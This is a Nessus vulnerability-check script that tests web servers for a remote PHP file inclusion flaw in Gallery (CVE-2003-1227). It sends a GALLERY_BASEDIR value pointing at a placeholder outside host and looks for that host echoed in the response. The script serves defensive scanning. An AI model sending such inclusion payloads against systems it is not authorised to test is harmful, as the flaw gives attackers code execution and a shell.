#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# (C) Tenable Network Security
#


if(description)
{
 script_id(11876);
 script_cve_id("CVE-2003-1227");
 script_bugtraq_id(8814);
 script_version ("$Revision: 1.11 $");
 name["english"] = "gallery code injection (2)";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to make the remote host include php files hosted
on a third party server using Gallery.

An attacker may use this flaw to inject arbitrary code in the remote
host and gain a shell with the privileges of the web server.

Solution : Upgrade to Gallery 1.4pl2 or 1.4.1 or newer
Risk factor : High";




 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of setup/index.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);
if(! can_host_php(port:port) ) exit(0);

function check(url)
{
req = http_get(item:string(url, "/setup/index.php?GALLERY_BASEDIR=http://xxxxxxxx/"),
 		port:port);
r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if ( r == NULL ) exit(0);
 if(egrep(pattern:"http://xxxxxxxx//?util.php", string:r))
 	{
 	security_hole(port);
	exit(0);
	}
 
}

foreach dir (cgi_dirs())
 check(url:dir);
